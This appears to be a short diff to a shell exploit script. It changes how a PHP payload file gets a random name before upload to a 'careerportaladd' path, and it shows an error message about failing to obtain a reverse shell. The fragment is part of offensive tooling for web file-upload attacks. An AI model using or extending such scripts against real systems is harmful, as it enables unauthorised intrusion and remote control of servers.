@@ -65,7 +65,8 @@ getVersion() {
 }
 
 writePayload(){
-	tmpfile=`tempfile 2>/dev/null`.php
+
+	tmpfile=$(tr -dc A-Za-z0-9 </dev/urandom | head -c 5)".php"
 	file=`basename $tmpfile`
 	echo "$1" > $tmpfile
 }
@@ -145,4 +146,4 @@ then
 	rev $target/upload/careerportaladd/$file
 else
 	echo -e "${red}[-] Couldn't get reverse shell.\n Maybe you should try it manually or use another payload.${reset}"
-fi 
+fi
